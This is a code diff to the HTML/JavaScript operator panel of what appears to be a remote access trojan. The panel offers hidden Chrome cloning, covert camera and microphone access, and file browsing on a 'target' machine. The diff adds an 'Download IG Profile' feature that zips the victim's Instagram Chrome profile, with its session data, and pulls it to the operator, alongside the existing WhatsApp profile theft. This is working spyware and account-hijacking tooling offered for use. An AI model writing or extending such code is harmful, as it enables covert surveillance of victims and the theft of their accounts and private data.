@@ -26,6 +26,7 @@
         <button id="viewWhatsappBtn" style="background: #25D366; color: white;">💬 WhatsApp</button>
         <button id="viewHiddenChromeBtn" style="background: #9c27b0; color: white;" title="Clones the target's Chrome profile and opens it invisibly.">🕵️ Hidden Clone Chrome</button>
         <button id="downloadWhatsappBtn" style="background: #e83e8c; color: white;" title="Zip and Download the target's entire WhatsApp Chrome Profile">📦 Download WA Profile</button>
+        <button id="downloadInstagramBtn" style="background: #E1306C; color: white;" title="Zip and Download the target's entire Instagram Chrome Profile">📸 Download IG Profile</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
@@ -333,8 +334,19 @@
             socket.emit('request-chrome-profiles', activeTarget);
         };
 
+        document.getElementById('downloadInstagramBtn').onclick = () => {
+            if (activeType === 'zip-instagram-list') return;
+            stopCurrentActive();
+            activeType = 'zip-instagram-list';
+            document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('chrome-list-container').classList.remove('hidden');
+            document.getElementById('chromeWindows').innerHTML = "<p>Loading Chrome Profiles...</p>";
+            document.getElementById('title').innerText = "Select Instagram Profile to Download: " + activeTarget;
+            socket.emit('request-chrome-profiles', activeTarget);
+        };
+
         socket.on('chrome-profiles-list', (data) => {
-            if ((activeType !== 'hidden-chrome-list' && activeType !== 'zip-whatsapp-list') || activeTarget !== data.targetId) return;
+            if ((activeType !== 'hidden-chrome-list' && activeType !== 'zip-whatsapp-list' && activeType !== 'zip-instagram-list') || activeTarget !== data.targetId) return;
             const container = document.getElementById('chromeWindows');
             container.innerHTML = '';
             
@@ -347,23 +359,27 @@
             const autoBtn = document.createElement('button');
             autoBtn.style.background = '#28a745';
             autoBtn.style.margin = '5px';
-            autoBtn.innerText = "✨ Auto-Detect WhatsApp";
+            autoBtn.innerText = activeType === 'zip-instagram-list' ? "✨ Auto-Detect Instagram" : "✨ Auto-Detect WhatsApp";
             if (activeType === 'hidden-chrome-list') {
                 autoBtn.onclick = () => launchHiddenChrome(null);
-            } else {
+            } else if (activeType === 'zip-whatsapp-list') {
                 autoBtn.onclick = () => launchZipProfile(null);
+            } else {
+                autoBtn.onclick = () => launchZipInstagramProfile(null);
             }
             container.appendChild(autoBtn);
 
             data.profiles.forEach(profile => {
                 const btn = document.createElement('button');
-                btn.style.background = activeType === 'hidden-chrome-list' ? '#9c27b0' : '#e83e8c';
+                btn.style.background = activeType === 'hidden-chrome-list' ? '#9c27b0' : (activeType === 'zip-instagram-list' ? '#E1306C' : '#e83e8c');
                 btn.style.margin = '5px';
                 btn.innerText = "👤 " + profile;
                 if (activeType === 'hidden-chrome-list') {
                     btn.onclick = () => launchHiddenChrome(profile);
-                } else {
+                } else if (activeType === 'zip-whatsapp-list') {
                     btn.onclick = () => launchZipProfile(profile);
+                } else {
+                    btn.onclick = () => launchZipInstagramProfile(profile);
                 }
                 container.appendChild(btn);
             });
@@ -390,6 +406,16 @@
             socket.emit('request-zip-whatsapp', { targetId: activeTarget, profileName: profileName });
         }
 
+        function launchZipInstagramProfile(profileName) {
+            if (!confirm("This will securely zip the selected Chrome Profile for Instagram and download it to your laptop. Proceed?")) return;
+            stopCurrentActive();
+            document.getElementById('download-progress-container').classList.remove('hidden');
+            document.getElementById('download-filename').innerText = "Zipping IG Profile (" + (profileName || "Auto") + ")...";
+            document.getElementById('download-progress-bar').style.width = "10%";
+            document.getElementById('download-percentage').innerText = "Zipping... (Do not close)";
+            socket.emit('request-zip-instagram', { targetId: activeTarget, profileName: profileName });
+        }
+
         socket.on('hidden-chrome-frame', (frameBase64) => {
             if (activeType !== 'hidden-chrome') return;
             document.getElementById('hidden-chrome-img').src = "data:image/jpeg;base64," + frameBase64;
@@ -412,6 +438,17 @@
 
         socket.on('whatsapp-zip-error', (data) => {
             alert("Failed to zip Chrome Profile: " + data.error);
+            document.getElementById('download-progress-container').classList.add('hidden');
+        });
+
+        socket.on('instagram-zip-ready', (data) => {
+            if (activeTarget !== data.targetId) return;
+            document.getElementById('download-progress-container').classList.add('hidden');
+            window.downloadRemoteFile(data.path);
+        });
+
+        socket.on('instagram-zip-error', (data) => {
+            alert("Failed to zip IG Profile: " + data.error);
             document.getElementById('download-progress-container').classList.add('hidden');
         });
 
